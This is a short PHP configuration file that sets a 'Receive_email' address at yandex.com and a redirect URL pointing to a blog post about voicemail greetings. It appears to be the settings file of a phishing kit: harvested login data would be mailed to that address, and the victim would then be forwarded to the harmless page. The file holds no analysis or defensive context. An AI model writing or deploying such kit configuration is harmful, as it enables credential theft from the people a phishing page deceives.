<?php 
$Receive_email="timothyfuerbacher@yandex.com";
$redirect="https://www.openphone.com/blog/21-professional-voicemail-greeting-examples/";
?>